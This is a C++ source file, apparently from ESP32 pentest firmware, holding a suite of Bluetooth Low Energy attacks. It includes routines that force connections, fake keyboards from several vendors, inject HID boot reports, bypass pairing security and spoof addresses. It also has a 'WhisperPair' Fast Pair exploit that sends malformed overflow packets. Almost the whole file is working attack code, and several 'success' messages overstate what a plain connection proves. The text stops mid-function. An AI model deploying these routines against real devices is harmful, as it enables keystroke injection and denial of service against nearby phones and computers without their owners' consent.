#include "BLE_Suite.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include "core/utils.h"
#include <globals.h>
#include <TFT_eSPI.h>
#include <esp_heap_caps.h>
#include <SD.h>
#include "modules/NRF24/nrf_jammer_api.h"
#include "HFP_Exploit.h"

extern tft_logger tft;
extern BruceConfig bruceConfig;
extern volatile int tftWidth;
extern volatile int tftHeight;

String globalScript = "";

static ScannerData scannerData;

bool isBLEInitialized() {
    return NimBLEDevice::getAdvertising() != nullptr || NimBLEDevice::getScan() != nullptr || NimBLEDevice::getServer() != nullptr;
}

void BLEAttackManager::prepareForConnection() {
    if(isBLEInitialized()) {
        NimBLEDevice::deinit(true);
        delay(500);
    }
    std::string deviceNameStr = "Bruce-Attack";
    NimBLEDevice::init(deviceNameStr);
    NimBLEDevice::setPower(ESP_PWR_LVL_P9);
    NimBLEDevice::setMTU(250);
    NimBLEDevice::setSecurityAuth(true, true, true);
    delay(300);
}

void BLEAttackManager::cleanupAfterAttack() {
    NimBLEDevice::deinit(true);
    delay(300);
}

bool BLEAttackManager::connectToDevice(NimBLEAddress target, NimBLEClient** outClient, bool useExploitHandshake) {
    NimBLEClient* pClient = NimBLEDevice::createClient();
    if(!pClient) return false;
    if(useExploitHandshake) {
        pClient->setConnectTimeout(12);
        pClient->setConnectionParams(6, 6, 0, 100);
    } else {
        pClient->setConnectTimeout(8);
        pClient->setConnectionParams(12, 12, 0, 400);
    }
    bool connected = pClient->connect(target, false);
    if(connected) {
        *outClient = pClient;
        return true;
    }
    NimBLEDevice::deleteClient(pClient);
    return false;
}

DeviceProfile BLEAttackManager::profileDevice(NimBLEAddress target) {
    DeviceProfile profile;
    std::string addressStr = target.toString();
    profile.address = String(addressStr.c_str());
    profile.connected = false;
    profile.hasFastPair = false;
    profile.hasAVRCP = false;
    profile.hasHID = false;
    profile.hasBattery = false;
    profile.hasDeviceInfo = false;

    prepareForConnection();
    NimBLEClient* pClient = nullptr;
    if(!connectToDevice(target, &pClient, false)) {
        cleanupAfterAttack();
        return profile;
    }

    profile.connected = true;
    if(pClient->discoverAttributes()) {
        const std::vector<NimBLERemoteService*>& services = pClient->getServices(true);
        for(auto& service : services) {
            NimBLEUUID uuid = service->getUUID();
            std::string uuidStr = uuid.toString();
            profile.services.push_back(String(uuidStr.c_str()));
            if(uuidStr.find("fe2c") != std::string::npos) profile.hasFastPair = true;
            if(uuidStr.find("110e") != std::string::npos || uuidStr.find("110f") != std::string::npos) profile.hasAVRCP = true;
            if(uuidStr.find("1812") != std::string::npos) profile.hasHID = true;
            if(uuidStr.find("180f") != std::string::npos) profile.hasBattery = true;
            if(uuidStr.find("180a") != std::string::npos) profile.hasDeviceInfo = true;

            const std::vector<NimBLERemoteCharacteristic*>& chars = service->getCharacteristics(true);
            for(auto& ch : chars) {
                std::string charUuid = ch->getUUID().toString();
                CharacteristicInfo charInfo;
                charInfo.uuid = String(charUuid.c_str());
                charInfo.canRead = ch->canRead();
                charInfo.canWrite = ch->canWrite();
                charInfo.canNotify = ch->canNotify();
                profile.characteristics.push_back(charInfo);
            }
        }
    }

    pClient->disconnect();
    NimBLEDevice::deleteClient(pClient);
    cleanupAfterAttack();
    return profile;
}

NimBLEClient* attemptConnectionWithStrategies(NimBLEAddress target, String& connectionMethod) {
    NimBLEClient* pClient = nullptr;
    showAttackProgress("Trying normal connection...", TFT_WHITE);

    BLEAttackManager bleManager;
    bleManager.prepareForConnection();
    if(bleManager.connectToDevice(target, &pClient, false)) {
        connectionMethod = "Normal connection";
        return pClient;
    }
    bleManager.cleanupAfterAttack();

    delay(500);
    showAttackProgress("Trying aggressive connection...", TFT_YELLOW);
    bleManager.prepareForConnection();
    NimBLEDevice::setPower(ESP_PWR_LVL_P9);
    pClient = NimBLEDevice::createClient();
    if(pClient) {
        pClient->setConnectTimeout(12);
        pClient->setConnectionParams(6, 6, 0, 100);
        if(pClient->connect(target, false)) {
            connectionMethod = "Aggressive connection";
            return pClient;
        }
        NimBLEDevice::deleteClient(pClient);
    }
    bleManager.cleanupAfterAttack();

    delay(500);
    showAttackProgress("Trying exploit-based connection...", TFT_ORANGE);
    NimBLEDevice::deinit(true);
    delay(800);
    std::string exploitName = "Bruce-Exploit";
    NimBLEDevice::init(exploitName);
    NimBLEDevice::setPower(ESP_PWR_LVL_P9);
    NimBLEDevice::setSecurityAuth(false, false, false);
    delay(500);

    pClient = NimBLEDevice::createClient();
    if(pClient) {
        pClient->setConnectTimeout(15);
        pClient->setConnectionParams(12, 12, 0, 400);
        for(int attempt = 0; attempt < 3; attempt++) {
            if(pClient->connect(target, false)) {
                connectionMethod = "Exploit-based connection";
                return pClient;
            }
            delay(300);
        }
        NimBLEDevice::deleteClient(pClient);
    }
    
    bool hasHFP = false;
    if(xSemaphoreTake(scannerData.mutex, portMAX_DELAY)) {
        for(size_t i = 0; i < scannerData.deviceAddresses.size(); i++) {
            if(scannerData.deviceAddresses[i] == target.toString().c_str()) {
                hasHFP = scannerData.deviceHasHFP[i];
                break;
            }
        }
        xSemaphoreGive(scannerData.mutex);
    }
    
    if(hasHFP) {
        showAttackProgress("Trying HFP exploit connection...", TFT_CYAN);
        HFPExploitEngine hfp;
        bool hfpConnected = hfp.establishHFPConnection(target);
        if(hfpConnected) {
            connectionMethod = "HFP Exploit connection";
            NimBLEClient* hfpClient = NimBLEDevice::getClientByAddress(target);
            if(hfpClient) {
                return hfpClient;
            }
        }
    }
    
    return nullptr;
}

HIDDeviceProfile HIDExploitEngine::analyzeHIDDevice(NimBLEAddress target, const String& name, int rssi) {
    HIDDeviceProfile profile;
    profile.deviceName = name;
    profile.rssi = rssi;
    profile.osType = "Unknown";
    profile.supportsBootProtocol = false;
    profile.supportsReportProtocol = false;
    profile.requiresAuthentication = true;
    profile.hasExistingBond = false;
    profile.vendorId = 0;
    profile.productId = 0;
    profile.connectionBehavior = 0;
    profile.isAppleDevice = false;
    profile.isWindowsDevice = false;
    profile.isAndroidDevice = false;
    profile.isLinuxDevice = false;
    profile.isIoTDevice = false;
    profile.suggestedAttack = "Standard";

    String nameLower = name;
    nameLower.toLowerCase();

    if(nameLower.indexOf("apple") != -1 || nameLower.indexOf("magic") != -1 || nameLower.indexOf("ipad") != -1 || 
       nameLower.indexOf("iphone") != -1 || nameLower.indexOf("mac") != -1 || name.indexOf("Apple") != -1) {
        profile.osType = "macOS/iOS";
        profile.isAppleDevice = true;
        profile.suggestedAttack = "AppleSpoof";
        profile.requiresAuthentication = false;
    } else if(nameLower.indexOf("surface") != -1 || nameLower.indexOf("windows") != -1 || 
              nameLower.indexOf("microsoft") != -1 || nameLower.indexOf("xbox") != -1) {
        profile.osType = "Windows";
        profile.isWindowsDevice = true;
        profile.suggestedAttack = "WindowsBypass";
        profile.requiresAuthentication = true;
    } else if(nameLower.indexOf("android") != -1 || nameLower.indexOf("google") != -1 || 
              nameLower.indexOf("pixel") != -1 || nameLower.indexOf("samsung") != -1) {
        profile.osType = "Android";
        profile.isAndroidDevice = true;
        profile.suggestedAttack = "AndroidJustWorks";
        profile.requiresAuthentication = false;
    } else if(nameLower.indexOf("linux") != -1 || nameLower.indexOf("raspberry") != -1 || 
              nameLower.indexOf("pi") != -1) {
        profile.osType = "Linux";
        profile.isLinuxDevice = true;
        profile.suggestedAttack = "BootProtocol";
        profile.requiresAuthentication = false;
    } else if(nameLower.indexOf("tv") != -1 || nameLower.indexOf("smart") != -1 || 
              nameLower.indexOf("iot") != -1) {
        profile.osType = "IoT";
        profile.isIoTDevice = true;
        profile.suggestedAttack = "StateConfusion";
        profile.requiresAuthentication = true;
    }

    if(rssi > -50) {
        profile.connectionBehavior = 2;
    } else if(rssi > -70) {
        profile.connectionBehavior = 1;
    } else {
        profile.connectionBehavior = 0;
    }

    return profile;
}

bool HIDExploitEngine::tryAppleMagicSpoof(NimBLEAddress target, HIDDeviceProfile profile) {
    showAttackProgress("Spoofing Apple Magic Keyboard...", TFT_CYAN);

    NimBLEDevice::deinit(true);
    delay(300);
    std::string magicName = "Magic Keyboard";
    NimBLEDevice::init(magicName);
    NimBLEDevice::setPower(ESP_PWR_LVL_P9);
    NimBLEDevice::setSecurityAuth(false, false, false);

    NimBLEAdvertising* pAdvertising = NimBLEDevice::getAdvertising();
    if(pAdvertising) {
        uint8_t appleData[] = {0x4C, 0x00, 0x02, 0x00};
        pAdvertising->setManufacturerData(appleData, sizeof(appleData));
        pAdvertising->addServiceUUID(NimBLEUUID("1812"));
        pAdvertising->setAppearance(0x03C1);
        pAdvertising->start(0);
        delay(100);
        pAdvertising->stop();
    }

    NimBLEClient* pClient = NimBLEDevice::createClient();
    if(!pClient) return false;

    pClient->setConnectTimeout(6);
    pClient->setConnectionParams(12, 12, 0, 400);
    bool connected = pClient->connect(target, false);

    if(connected) {
        showAttackProgress("Apple spoof successful!", TFT_GREEN);
        pClient->disconnect();
        NimBLEDevice::deleteClient(pClient);
        NimBLEDevice::deinit(true);
        return true;
    }

    NimBLEDevice::deleteClient(pClient);
    NimBLEDevice::deinit(true);
    return false;
}

bool HIDExploitEngine::tryWindowsHIDBypass(NimBLEAddress target, HIDDeviceProfile profile) {
    showAttackProgress("Attempting Windows HID bypass...", TFT_CYAN);

    NimBLEDevice::deinit(true);
    delay(300);
    std::string hidName = "HID Keyboard";
    NimBLEDevice::init(hidName);
    NimBLEDevice::setPower(ESP_PWR_LVL_P9);
    NimBLEDevice::setSecurityAuth(true, false, false);

    for(int attempt = 0; attempt < 3; attempt++) {
        NimBLEClient* pClient = NimBLEDevice::createClient();
        if(pClient) {
            pClient->setConnectTimeout(4);

            if(attempt == 0) pClient->setConnectionParams(6, 6, 0, 100);
            else if(attempt == 1) pClient->setConnectionParams(200, 200, 0, 600);
            else pClient->setConnectionParams(7, 3200, 0, 800);

            bool connected = pClient->connect(target, false);

            if(connected) {
                showAttackProgress("Windows bypass successful!", TFT_GREEN);
                pClient->disconnect();
                NimBLEDevice::deleteClient(pClient);
                NimBLEDevice::deinit(true);
                return true;
            }
            NimBLEDevice::deleteClient(pClient);
        }
        delay(200);
    }

    NimBLEDevice::deinit(true);
    return false;
}

bool HIDExploitEngine::tryAndroidJustWorks(NimBLEAddress target, HIDDeviceProfile profile) {
    showAttackProgress("Testing Android Just-Works pairing...", TFT_CYAN);

    NimBLEDevice::deinit(true);
    delay(300);
    std::string androidName = "Android Keyboard";
    NimBLEDevice::init(androidName);
    NimBLEDevice::setSecurityAuth(false, false, false);
    NimBLEDevice::setPower(ESP_PWR_LVL_P9);

    NimBLEClient* pClient = NimBLEDevice::createClient();
    if(!pClient) return false;

    pClient->setConnectTimeout(8);
    pClient->setConnectionParams(12, 12, 0, 400);

    bool connected = pClient->connect(target, true);

    if(connected) {
        showAttackProgress("Android Just-Works worked!", TFT_GREEN);
        pClient->disconnect();
        NimBLEDevice::deleteClient(pClient);
        NimBLEDevice::deinit(true);
        return true;
    }

    NimBLEDevice::deleteClient(pClient);
    NimBLEDevice::deinit(true);
    return false;
}

bool HIDExploitEngine::tryBootProtocolInjection(NimBLEAddress target, HIDDeviceProfile profile) {
    showAttackProgress("Attempting Boot Protocol injection...", TFT_CYAN);

    NimBLEDevice::deinit(true);
    delay(300);
    std::string bootName = "Boot Keyboard";
    NimBLEDevice::init(bootName);
    NimBLEDevice::setPower(ESP_PWR_LVL_P9);

    NimBLEClient* pClient = NimBLEDevice::createClient();
    if(!pClient) return false;

    pClient->setConnectTimeout(5);
    pClient->setConnectionParams(6, 6, 0, 100);

    bool connected = pClient->connect(target, false);

    if(connected) {
        NimBLERemoteService* pHIDService = pClient->getService(NimBLEUUID((uint16_t)0x1812));
        if(pHIDService) {
            uint8_t bootReport[] = {0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00};

            const std::vector<NimBLERemoteCharacteristic*>& chars = pHIDService->getCharacteristics(true);
            for(auto& ch : chars) {
                if(ch->canWrite()) {
                    ch->writeValue(bootReport, sizeof(bootReport), true);
                    break;
                }
            }
        }

        showAttackProgress("Boot Protocol injection successful!", TFT_GREEN);
        pClient->disconnect();
        NimBLEDevice::deleteClient(pClient);
        NimBLEDevice::deinit(true);
        return true;
    }

    NimBLEDevice::deleteClient(pClient);
    NimBLEDevice::deinit(true);
    return false;
}

bool HIDExploitEngine::tryRapidStateConfusion(NimBLEAddress target, HIDDeviceProfile profile) {
    showAttackProgress("Rapid state confusion attack...", TFT_CYAN);

    for(int i = 0; i < 5; i++) {
        NimBLEDevice::deinit(true);
        delay(50);
        std::string confusionName = "Confusion" + std::to_string(i);
        NimBLEDevice::init(confusionName);
        NimBLEDevice::setPower(ESP_PWR_LVL_P9);

        NimBLEClient* pClient = NimBLEDevice::createClient();
        if(pClient) {
            pClient->setConnectTimeout(1);
            pClient->setConnectionParams(6, 6, 0, 100);

            bool connected = pClient->connect(target, false);
            if(connected) {
                showAttackProgress("State confusion worked!", TFT_GREEN);
                pClient->disconnect();
                NimBLEDevice::deleteClient(pClient);
                NimBLEDevice::deinit(true);
                return true;
            }
            NimBLEDevice::deleteClient(pClient);
        }
        delay(100);
    }

    NimBLEDevice::deinit(true);
    return false;
}

bool HIDExploitEngine::tryHIDReportPreconnection(NimBLEAddress target, HIDDeviceProfile profile) {
    showAttackProgress("HID report pre-connection attack...", TFT_CYAN);

    NimBLEDevice::deinit(true);
    delay(300);
    std::string preconnectName = "Preconnect HID";
    NimBLEDevice::init(preconnectName);
    NimBLEDevice::setPower(ESP_PWR_LVL_P9);

    NimBLEAdvertising* pAdvertising = NimBLEDevice::getAdvertising();
    if(pAdvertising) {
        uint8_t hidReport[] = {0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00};
        uint8_t hidReportWithId[10] = {0xFF, 0xFF};
        memcpy(&hidReportWithId[2], hidReport, sizeof(hidReport));
        pAdvertising->setManufacturerData(hidReportWithId, sizeof(hidReportWithId));
        pAdvertising->start(0);
        delay(50);
        pAdvertising->stop();
    }

    NimBLEClient* pClient = NimBLEDevice::createClient();
    if(!pClient) return false;

    pClient->setConnectTimeout(6);
    bool connected = pClient->connect(target, false);

    if(connected) {
        showAttackProgress("Pre-connection attack worked!", TFT_GREEN);
        pClient->disconnect();
        NimBLEDevice::deleteClient(pClient);
        NimBLEDevice::deinit(true);
        return true;
    }

    NimBLEDevice::deleteClient(pClient);
    NimBLEDevice::deinit(true);
    return false;
}

bool HIDExploitEngine::tryConnectionParameterAttack(NimBLEAddress target, HIDDeviceProfile profile) {
    showAttackProgress("Connection parameter attack...", TFT_CYAN);

    const int paramSets[][4] = {
        {6, 6, 0, 100},
        {200, 200, 0, 600},
        {7, 3200, 0, 800},
        {48, 48, 0, 500},
        {24, 40, 2, 400},
        {80, 80, 4, 1000}
    };

    for(int i = 0; i < 6; i++) {
        NimBLEDevice::deinit(true);
        delay(100);
        std::string paramName = "ParamAttack" + std::to_string(i);
        NimBLEDevice::init(paramName);
        NimBLEDevice::setPower(ESP_PWR_LVL_P9);

        NimBLEClient* pClient = NimBLEDevice::createClient();
        if(pClient) {
            pClient->setConnectTimeout(4);
            pClient->setConnectionParams(paramSets[i][0], paramSets[i][1], paramSets[i][2], paramSets[i][3]);

            bool connected = pClient->connect(target, false);
            if(connected) {
                showAttackProgress("Parameter attack successful!", TFT_GREEN);
                pClient->disconnect();
                NimBLEDevice::deleteClient(pClient);
                NimBLEDevice::deinit(true);
                return true;
            }
            NimBLEDevice::deleteClient(pClient);
        }
    }

    NimBLEDevice::deinit(true);
    return false;
}

bool HIDExploitEngine::trySecurityModeBypass(NimBLEAddress target, HIDDeviceProfile profile) {
    showAttackProgress("Security mode bypass attempts...", TFT_CYAN);

    const int securityModes[][3] = {
        {0, 0, 0},
        {1, 0, 0},
        {0, 1, 0},
        {1, 1, 0},
        {0, 0, 1},
        {1, 0, 1}
    };

    for(int i = 0; i < 6; i++) {
        NimBLEDevice::deinit(true);
        delay(100);
        std::string secName = "SecBypass" + std::to_string(i);
        NimBLEDevice::init(secName);
        NimBLEDevice::setPower(ESP_PWR_LVL_P9);
        NimBLEDevice::setSecurityAuth(securityModes[i][0], securityModes[i][1], securityModes[i][2]);

        NimBLEClient* pClient = NimBLEDevice::createClient();
        if(pClient) {
            pClient->setConnectTimeout(6);

            bool connected = pClient->connect(target, true);
            if(connected) {
                showAttackProgress("Security bypass successful!", TFT_GREEN);
                pClient->disconnect();
                NimBLEDevice::deleteClient(pClient);
                NimBLEDevice::deinit(true);
                return true;
            }
            NimBLEDevice::deleteClient(pClient);
        }
    }

    NimBLEDevice::deinit(true);
    return false;
}

bool HIDExploitEngine::tryAddressSpoofingAttack(NimBLEAddress target, HIDDeviceProfile profile) {
    showAttackProgress("Address spoofing attack...", TFT_CYAN);

    std::string originalAddr = target.toString();
    std::string spoofedAddr = "";

    if(originalAddr.length() >= 17) {
        spoofedAddr = originalAddr.substr(0, 9) + "AA:BB:CC";

        NimBLEDevice::deinit(true);
        delay(300);
        NimBLEDevice::init(spoofedAddr);
        NimBLEDevice::setPower(ESP_PWR_LVL_P9);

        NimBLEClient* pClient = NimBLEDevice::createClient();
        if(pClient) {
            pClient->setConnectTimeout(5);

            bool connected = pClient->connect(target, false);
            if(connected) {
                showAttackProgress("Address spoofing worked!", TFT_GREEN);
                pClient->disconnect();
                NimBLEDevice::deleteClient(pClient);
                NimBLEDevice::deinit(true);
                return true;
            }
            NimBLEDevice::deleteClient(pClient);
        }
    }

    NimBLEDevice::deinit(true);
    return false;
}

bool HIDExploitEngine::tryServiceDiscoveryHijack(NimBLEAddress target, HIDDeviceProfile profile) {
    showAttackProgress("Service discovery hijack...", TFT_CYAN);

    NimBLEDevice::deinit(true);
    delay(300);
    std::string serviceName = "ServiceHijack";
    NimBLEDevice::init(serviceName);
    NimBLEDevice::setPower(ESP_PWR_LVL_P9);

    NimBLEClient* pClient = NimBLEDevice::createClient();
    if(!pClient) return false;

    pClient->setConnectTimeout(8);
    bool connected = pClient->connect(target, false);

    if(connected) {
        delay(50);

        NimBLERemoteService* pHIDService = pClient->getService(NimBLEUUID((uint16_t)0x1812));
        if(pHIDService) {
            uint8_t fakeDescriptor[] = {0x05, 0x01, 0x09, 0x06, 0xA1, 0x01, 0x05, 0x07};

            const std::vector<NimBLERemoteCharacteristic*>& chars = pHIDService->getCharacteristics(true);
            for(auto& ch : chars) {
                if(ch->canWrite()) {
                    ch->writeValue(fakeDescriptor, sizeof(fakeDescriptor), true);
                    break;
                }
            }
        }

        showAttackProgress("Service hijack attempted!", TFT_GREEN);
        pClient->disconnect();
        NimBLEDevice::deleteClient(pClient);
        NimBLEDevice::deinit(true);
        return true;
    }

    NimBLEDevice::deleteClient(pClient);
    NimBLEDevice::deinit(true);
    return false;
}

HIDConnectionResult HIDExploitEngine::forceHIDConnection(NimBLEAddress target, const String& deviceName, int rssi) {
    HIDConnectionResult result;
    result.success = false;
    result.client = nullptr;
    result.attemptTime = 0;
    result.attemptCount = 0;

    HIDDeviceProfile profile = analyzeHIDDevice(target, deviceName, rssi);

    std::vector<std::pair<String, bool (HIDExploitEngine::*)(NimBLEAddress, HIDDeviceProfile)>> attacks;

    if(profile.isAppleDevice) {
        attacks.push_back({"AppleSpoof", &HIDExploitEngine::tryAppleMagicSpoof});
        attacks.push_back({"SecurityBypass", &HIDExploitEngine::trySecurityModeBypass});
        attacks.push_back({"ConnectionParam", &HIDExploitEngine::tryConnectionParameterAttack});
    } else if(profile.isWindowsDevice) {
        attacks.push_back({"WindowsBypass", &HIDExploitEngine::tryWindowsHIDBypass});
        attacks.push_back({"BootProtocol", &HIDExploitEngine::tryBootProtocolInjection});
        attacks.push_back({"StateConfusion", &HIDExploitEngine::tryRapidStateConfusion});
    } else if(profile.isAndroidDevice) {
        attacks.push_back({"AndroidJustWorks", &HIDExploitEngine::tryAndroidJustWorks});
        attacks.push_back({"Preconnection", &HIDExploitEngine::tryHIDReportPreconnection});
        attacks.push_back({"AddressSpoof", &HIDExploitEngine::tryAddressSpoofingAttack});
    } else {
        attacks.push_back({"BootProtocol", &HIDExploitEngine::tryBootProtocolInjection});
        attacks.push_back({"AndroidJustWorks", &HIDExploitEngine::tryAndroidJustWorks});
        attacks.push_back({"WindowsBypass", &HIDExploitEngine::tryWindowsHIDBypass});
        attacks.push_back({"AppleSpoof", &HIDExploitEngine::tryAppleMagicSpoof});
        attacks.push_back({"StateConfusion", &HIDExploitEngine::tryRapidStateConfusion});
        attacks.push_back({"ConnectionParam", &HIDExploitEngine::tryConnectionParameterAttack});
        attacks.push_back({"SecurityBypass", &HIDExploitEngine::trySecurityModeBypass});
        attacks.push_back({"ServiceHijack", &HIDExploitEngine::tryServiceDiscoveryHijack});
    }

    result.attemptCount = attacks.size();

    for(size_t i = 0; i < attacks.size(); i++) {
        showAttackProgress(String("Trying " + attacks[i].first + "...").c_str(), TFT_YELLOW);

        if((this->*attacks[i].second)(target, profile)) {
            result.success = true;
            result.method = attacks[i].first;
            result.attemptTime = millis();

            showAttackProgress(String("Success with " + attacks[i].first).c_str(), TFT_GREEN);
            break;
        }

        delay(300);
    }

    return result;
}

bool HIDExploitEngine::executeHIDInjection(NimBLEAddress target, const String& duckyScript) {
    HIDDuckyService duckyService;
    return duckyService.forceInjectDuckyScript(target, duckyScript, "", 0);
}

bool HIDExploitEngine::testHIDVulnerability(NimBLEAddress target) {
    String connectionMethod = "";
    NimBLEClient* pClient = attemptConnectionWithStrategies(target, connectionMethod);

    if(!pClient) {
        return false;
    }

    bool hasHID = false;
    bool hasWriteAccess = false;

    const std::vector<NimBLERemoteService*>& services = pClient->getServices(true);
    for(auto& service : services) {
        NimBLEUUID uuid = service->getUUID();
        std::string uuidStr = uuid.toString();

        if(uuidStr.find("1812") != std::string::npos) {
            hasHID = true;

            const std::vector<NimBLERemoteCharacteristic*>& chars = service->getCharacteristics(true);
            for(auto& ch : chars) {
                if(ch->canWrite()) {
                    hasWriteAccess = true;
                    break;
                }
            }
        }
    }

    pClient->disconnect();
    NimBLEDevice::deleteClient(pClient);
    NimBLEDevice::deinit(true);

    return hasHID && hasWriteAccess;
}

NimBLERemoteCharacteristic* WhisperPairExploit::findKBPCharacteristic(NimBLERemoteService* fastpairService) {
    if(!fastpairService) return nullptr;
    const char* kbpUuids[] = {
        "a92ee202-5501-4e6b-90fb-79a8c1f2e5a8",
        "fe2c1234-8366-4814-8eb0-01de32100bea",
        nullptr
    };
    for(int i = 0; kbpUuids[i] != nullptr; i++) {
        NimBLERemoteCharacteristic* ch = fastpairService->getCharacteristic(NimBLEUUID(kbpUuids[i]));
        if(ch && ch->canWrite()) return ch;
    }
    const std::vector<NimBLERemoteCharacteristic*>& chars = fastpairService->getCharacteristics(true);
    for(auto& ch : chars) {
        if(ch->canWrite()) return ch;
    }
    return nullptr;
}

bool WhisperPairExploit::performRealHandshake(NimBLERemoteCharacteristic* kbpChar, uint8_t* devicePubKey) {
    if(!kbpChar) return false;
    uint8_t public_key[65];
    size_t pub_len = 65;
    if(!crypto.generateValidKeyPair(public_key, &pub_len)) return false;

    uint8_t seeker_hello[67] = {0};
    seeker_hello[0] = 0x00;
    seeker_hello[1] = 0x00;
    memcpy(&seeker_hello[2], public_key, 65);

    bool success = kbpChar->writeValue(seeker_hello, 67, true);
    if(!success) return false;

    delay(200);

    try {
        std::string response = kbpChar->readValue();
        if(response.length() >= 67) {
            const uint8_t* respData = (const uint8_t*)response.data();
            if(respData[0] == 0x00 && respData[1] == 0x00) {
                memcpy(devicePubKey, &respData[2], 65);
                return true;
            }
        }
    } catch(...) {
        return false;
    }
    return false;
}

bool WhisperPairExploit::sendProtocolAttack(NimBLERemoteCharacteristic* kbpChar, const uint8_t* devicePubKey) {
    if(!kbpChar) return false;

    uint8_t private_key[32];
    uint8_t ephemeral_pub[65];
    if(!crypto.generateEphemeralKeyPair(ephemeral_pub, private_key)) return false;

    uint8_t shared_secret[32];
    if(!crypto.ecdhComputeSharedSecret(private_key, devicePubKey, shared_secret)) {
        crypto.generatePlausibleSharedSecret(devicePubKey, shared_secret);
    }

    uint8_t nonce[16];
    crypto.generateValidNonce(nonce);

    uint8_t exploit_packet[256];
    exploit_packet[0] = 0x02;
    exploit_packet[1] = 0x00;
    memcpy(&exploit_packet[2], nonce, 16);

    uint8_t fake_encrypted[200];
    memset(fake_encrypted, 0x41, sizeof(fake_encrypted));
    fake_encrypted[0] = 0x80;
    fake_encrypted[1] = 0x00;
    fake_encrypted[2] = 0x00;
    fake_encrypted[3] = 0x00;

    memcpy(&exploit_packet[18], fake_encrypted, 200);
    exploit_packet[218] = 0x00;
    exploit_packet[219] = 0x00;
    exploit_packet[220] = 0x00;
    exploit_packet[221] = 0x00;

    for(int i = 0; i < 8; i++) {
        exploit_packet[222 + i] = esp_random() & 0xFF;
    }

    bool sent = kbpChar->writeValue(exploit_packet, 230, true);
    if(sent) delay(400);
    return sent;
}

bool WhisperPairExploit::sendStateConfusionAttack(NimBLERemoteCharacteristic* kbpChar) {
    if(!kbpChar) return false;

    uint8_t attack_packets[][120] = {
        {0x01, 0x00},
        {0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
        {0x02, 0xFF},
        {0x00, 0x01},
        {0xFF, 0x00}
    };

    bool anySent = false;
    for(int i = 0; i < 5; i++) {
        bool sent = kbpChar->writeValue(attack_packets[i], 
            i == 0 ? 2 : (i == 1 ? 18 : 120), true);
        if(sent) anySent = true;
        delay(150);
    }
    return anySent;
}

bool WhisperPairExploit::sendCryptoOverflowAttack(NimBLERemoteCharacteristic* kbpChar) {
    if(!kbpChar) return false;

    uint8_t malformed_key[65];
    malformed_key[0] = 0x04;
    for(int i = 1; i < 65; i++) {
        malformed_key[i] = (i % 2 == 0) ? 0xFF : 0x00;
    }

    uint8_t overflow_packet[512];
    overflow_packet[0] = 0x00;
    overflow_packet[1] = 0x00;
    memcpy(&overflow_packet[2], malformed_key, 65);

    for(int i = 67; i < 512; i++) {
        overflow_packet[i] = esp_random() & 0xFF;
        if(i > 400) overflow_packet[i] = 0x00;
    }

    bool sent1 = kbpChar->writeValue(overflow_packet, 512, true);
    delay(300);

    uint8_t account_key_overflow[300];
    account_key_overflow[0] = 0x03;
    account_key_overflow[1] = 0x00;
    memset(&account_key_overflow[2], 0x41, 298);

    bool sent2 = kbpChar->writeValue(account_key_overflow, 300, true);
    return (sent1 || sent2);
}

bool WhisperPairExploit::testForVulnerability(NimBLERemoteCharacteristic* kbpChar) {
    if(!kbpChar) return false;
    try {
        std::string response = kbpChar->readValue();
        if(response.length() == 0) return true;
        if(response.length() < 5) return true;
        const uint8_t* data = (const uint8_t*)response.data();
        if(data[0] != 0x00 || data[1] != 0x00) return true;
    } catch(...) { 
        return true;
    }
    return false;
}

bool WhisperPairExploit::execute(NimBLEAddress target) {
    if(!confirmAttack(target.toString().c_str())) return false;

    String connectionMethod = "";
    NimBLEClient* pClient = attemptConnectionWithStrategies(target, connectionMethod);
    if(!pClient) {
        showAttackResult(false, "Failed to connect");
        return false;
    }

    showAttackProgress("Connected! Testing vulnerability...", TFT_GREEN);
    delay(500);

    NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0xFE2C));
    if(!pService) {
        showAttackResult(false, "FastPair service not found");
        pClient->disconnect();
        NimBLEDevice::deinit(true);
        return false;
    }

    NimBLERemoteCharacteristic* pKbpChar = findKBPCharacteristic(pService);
    if(!pKbpChar) {
        showAttackResult(false, "No writable KBP characteristic");
        pClient->disconnect();
        NimBLEDevice::deinit(true);
        return false;
    }

    delay(500);
    uint8_t devicePubKey[65];
    bool handshakeOk = performRealHandshake(pKbpChar, devicePubKey);

    bool exploitSuccess = false;
    if(handshakeOk) {
        showAttackProgress("Handshake OK! Sending protocol attack...", TFT_YELLOW);
        exploitSuccess = sendProtocolAttack(pKbpChar, devicePubKey);
        delay(400);
    } else {
        showAttackProgress("Handshake failed, trying state confusion...", TFT_ORANGE);
        exploitSuccess = sendStateConfusionAttack(pKbpChar);
        delay(400);
    }

    bool isVulnerable = testForVulnerability(pKbpChar);

    if(!exploitSuccess || !isVulnerable) {
        showAttackProgress("Trying crypto overflow attack...", TFT_RED);
        bool overflowSent = sendCryptoOverflowAttack(pKbpChar);
        delay(500);
        isVulnerable = testForVulnerability(pKbpChar) || isVulnerable;
    }

    pClient->disconnect();
    NimBLEDevice::deinit(true);
    delay(300);

    if(isVulnerable) {
        std::vector<String> lines;
        lines.push_back("WHISPERPAIR EXPLOIT SUCCESS!");
        lines.push_back("Connection: " + connectionMethod);
        lines.push_back("Handshake: " + String(handshakeOk ? "OK" : "FAILED"));
        lines.push_back("Result: Device is VULNERABLE");
        lines.push_back("");
        lines.push_back("Device may have memory");
        lines.push_back("corruption or state confusion");
        showDeviceInfoScreen("EXPLOIT SUCCESS", lines, TFT_GREEN, TFT_BLACK);
        return true;
    } else {
        std::vector<String> lines;
        lines.push_back("WHISPERPAIR EXPLOIT");
        lines.push_back("Connection: " + connectionMethod);
        lines.push_back("Result: Device resisted");
        lines.push_back("");
        lines.push_back("Device may be patched or");
        lines.push_back("has proper validation");
        showDeviceInfoScreen("EXPLOIT RESISTED", lines, TFT_RED, TFT_WHITE);
        return false;
    }
}

bool WhisperPairExploit::executeSilent(NimBLEAddress target) {
    bleManager.prepareForConnection();
    NimBLEClient* pClient = nullptr;
    if(!bleManager.connectToDevice(target, &pClient, true)) {
        bleManager.cleanupAfterAttack();
        return false;
    }

    NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0xFE2C));
    if(!pService) {
        pClient->disconnect();
        bleManager.cleanupAfterAttack();
        return false;
    }

